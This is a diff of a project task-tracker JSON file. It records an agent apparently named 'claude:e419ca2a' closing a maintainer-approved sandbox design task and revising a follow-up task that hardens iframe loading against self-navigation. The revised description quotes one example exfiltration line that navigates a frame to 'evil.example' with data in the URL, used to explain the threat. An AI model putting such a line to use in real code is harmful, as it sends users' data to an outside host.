@@ -10333,14 +10333,14 @@
       "description": "Settle, with the maintainer, how the sandbox closes the gaps of [the audit](docs/codebase-audit.md) S1, S2, S3, S16, S17, S18, B7 and B8, then write the decisions into [the sandbox's design](docs/running-components-in-the-sandbox.md) and [its protocol](docs/sandbox-protocol.md) before any code changes. The points are coupled: what a frame is sent depends on who it is for, and when a frame is believed depends on how it was made.\n\n## Points to settle\n- **S1, a frame that navigates itself:** the parent says hello only for a load it started; any other `load` fails the frame and shows the fallback. Whether the host page's `frame-src` becomes a stated requirement, and whether `runCheck` probes it.\n- **S2, code per pack:** `ComponentCode` carries its pack (or a trust key), and a permissive frame gets only its own pack's permissive code plus strict code; another pack's permissive component there is `not-here`.\n- **S3, B8, correlation:** compile, image and host requests matched by numeric id, with a timeout each; a superseded request is rejected; only a matched answer is cached.\n- **S16, frame mode's `set`:** own keys only, and whether a page frame may set any document input or only bound ones.\n- **S17, `link`:** checked with `safeUrl` in the parent, and the docs say its URL and timing are untrusted.\n- **S18:** whether a frame refuses to start unless `self.origin === \"null\"`, and whether the `sandbox` header becomes a MUST.\n- **B7:** trust and print keyed by a component's entry (example scope included), not its name.\n- **B8:** one reload rule for page, use and compile frames; a version mismatch answered so the parent reports `version`.\n\n## Done when\nThe design and the protocol doc lead with these decisions, the protocol doc's message tables match `src/protocol/messages.ts` (audit I1), and the follow-up tasks below match what was decided (update them with `atm task edit`).",
       "requirements": [],
       "use_cases": [],
-      "status": "in_progress",
+      "status": "done",
       "dependencies": [],
       "files": [
         "docs/running-components-in-the-sandbox.md",
         "docs/sandbox-protocol.md"
       ],
       "created_at": "2026-11-20T06:49:09Z",
-      "updated_at": "2026-11-24T20:05:54Z",
+      "updated_at": "2026-11-24T20:20:37Z",
       "created_by": "Hakan Serce",
       "updated_by": "claude:e419ca2a",
       "sprint_history": [
@@ -10353,7 +10353,44 @@
       "with": "user",
       "number": 269,
       "started_at": "2026-11-24T20:05:54Z",
-      "started_by": "claude:e419ca2a"
+      "started_by": "claude:e419ca2a",
+      "commit": "111820e5e588481aa82960dd98f7aa13b03f7dc1",
+      "code_reviews": [
+        {
+          "id": "01a20f34-59ed-74f0-876a-c6de9579f3e9",
+          "ref": "CR-121"
+        }
+      ],
+      "review_requested_at": "2026-11-24T20:16:59Z",
+      "notes": [
+        {
+          "at": "2026-11-24T20:16:59Z",
+          "kind": "review",
+          "text": "CR-121: Closing the sandbox boundary gaps: the decisions",
+          "by": "claude:e419ca2a"
+        },
+        {
+          "at": "2026-11-24T20:20:20Z",
+          "kind": "note",
+          "text": "Approved: in CR-121 (round 1)",
+          "by": "Hakan Serce"
+        },
+        {
+          "at": "2026-11-24T20:20:37Z",
+          "kind": "outcome",
+          "text": "Approved in CR-121: decision 10 of the sandbox design, protocol decisions 5 to 7, the hosting requirements, and the five follow-up tasks updated.",
+          "by": "claude:e419ca2a"
+        }
+      ],
+      "reviews": [
+        {
+          "from": "2026-11-24T20:16:59Z",
+          "to": "2026-11-24T20:20:20Z",
+          "outcome": "approved"
+        }
+      ],
+      "completed_at": "2026-11-24T20:20:37Z",
+      "completed_by": "claude:e419ca2a"
     },
     {
       "id": "01a1f7b7-53d9-7730-bb1c-8cd8e8485171",
@@ -10437,10 +10474,10 @@
         "security",
         "sandbox"
       ],
-      "description": "Audit S1 and B8 ([the audit](docs/codebase-audit.md)), as [the sandbox's design](docs/running-components-in-the-sandbox.md), decision 10, and [its protocol](docs/sandbox-protocol.md), decision 5, now say (CMD-269).\n\nToday `frameUse` says hello on every `load` (`npm-packages/sandbox/src/use.ts`). So a strict frame that runs `location.replace(...)` sends its data away in the URL, and the page that loads is then given a port, the code, the part with the document's inputs, and `host` when the use has it. The page and compile frames say hello once (`pages.ts`, `host/runtime.ts`).\n\n## Decided\n- A parent says `hello` only after a load it started, by giving the frame its `src`. Any other `load` removes the frame and shows its use's fallback (W118), with nothing said to what loaded. This holds for page, use and compile frames alike.\n- A frame whose `ready` names another sandbox version is removed and reported with the reason `version` (a new `ErrorReason`), not as unloaded.\n- The host's page MUST have `frame-src` naming the frames' origin (docs/hosting.md, decision 10). `runCheck` probes for it: a strict frame that navigates itself to another origin must be refused.\n\n## Change\n- One frame-making helper (audit A3) that owns the `sandbox` and `allow` attributes, the hello, and the reload rule, used by `frameUse`, `framePage` and the compile frame.\n- A `load` the parent didn't start fails the frame: removed, its fallback shown, the observer told.\n- Reloads no longer leak a channel and a `serveHost` listener in `#frameEvents`.\n- The `version` reason, reported by the parent.\n- `runCheck`'s self-navigation probe.\n\n## Tests\nBrowser tests in Chrome and WebKit:\n- a strict frame that navigates itself, with `location` and with a link clicked after `stopPropagation`, shows its fallback and gets no second hello;\n- a page frame and the compile frame that navigate themselves are removed the same way;\n- a frame of another version is reported as `version`;\n- `runCheck` fails on a page without `frame-src`.\n",
+      "description": "Audit S1 and B8 ([the audit](docs/codebase-audit.md)), as [the sandbox's design](docs/running-components-in-the-sandbox.md), decision 10, and [its protocol](docs/sandbox-protocol.md), decision 5, now say (CMD-269, revised with the maintainer while starting this task).\n\nA strict frame can navigate itself (`location.replace(\"https://evil.example/?\" + data)`). The data in the URL is stopped only by the host page's `frame-src`. What the sandbox must stop is admitting what loads next: `frameUse` says hello on every `load` (`npm-packages/sandbox/src/use.ts`), so the foreign page is given a port, the code, the part with the document's inputs, and `host`. The page and compile frames say hello once (`pages.ts`, `host/runtime.ts`), so they admit nothing, but a second load leaves them hung until the ping's timeout.\n\n## Decided\n- A parent says `hello` only after a load it started, by giving the frame its `src`.\n- **A use frame**, on a load it didn't start (a self-navigation, or its element moved, which the parent can't tell apart), gives nothing to what loaded and sets its `src` again, then connects after that load as today. Three such loads within 10 s fail the frame: removed, its fallback shown (W118). (Not \"with no `ready` between them\", as first written: a restarted frame says `ready` before its code navigates again, so that never stops a loop.)\n- **The page and compile frames** are greeted once. A second load fails them at once, with an error. No replay.\n- A frame whose `ready` names another sandbox version is reported with the reason `version`, not as unloaded.\n- The host's page MUST have `frame-src` naming the frames' origin (docs/hosting.md, decision 10), and `runCheck` probes for it.\n\n## Change\n- A small helper that makes a frame (the `sandbox` and `allow` attributes) and tells a load it started from any other, used by `frameUse`, `framePage` and the compile frame.\n- Reloads no longer leak a channel and a `serveHost` listener in `#frameEvents`.\n- The `version` reason; `runCheck`'s self-navigation probe.\n\n## Tests\nBrowser tests in Chrome and WebKit:\n- a strict use frame that navigates itself gets no second hello on what loaded, and is back on its own document; one that keeps navigating shows its fallback;\n- a use frame whose element is moved boots again and draws;\n- a page frame that navigates itself fails with an error;\n- `runCheck` fails on a page without `frame-src`.\n",
       "requirements": [],
       "use_cases": [],
-      "status": "todo",
+      "status": "in_progress",
       "dependencies": [
         "01a1f7b7-53d9-7730-bb1c-8cd7c96932d9"
       ],
@@ -10451,7 +10488,7 @@
         "npm-packages/sandbox/test/strict.test.ts"
       ],
       "created_at": "2026-11-20T06:49:09Z",
-      "updated_at": "2026-11-24T20:11:48Z",
+      "updated_at": "2026-11-24T20:34:11Z",
       "created_by": "Hakan Serce",
       "updated_by": "claude:e419ca2a",
       "sprint_history": [
@@ -10461,7 +10498,9 @@
         }
       ],
       "sprint": "Audit - Nov19",
-      "number": 271
+      "number": 271,
+      "started_at": "2026-11-24T20:20:37Z",
+      "started_by": "claude:e419ca2a"
     },
     {
       "id": "01a1f7b7-53d9-7730-bb1c-8cdabf3508ee",
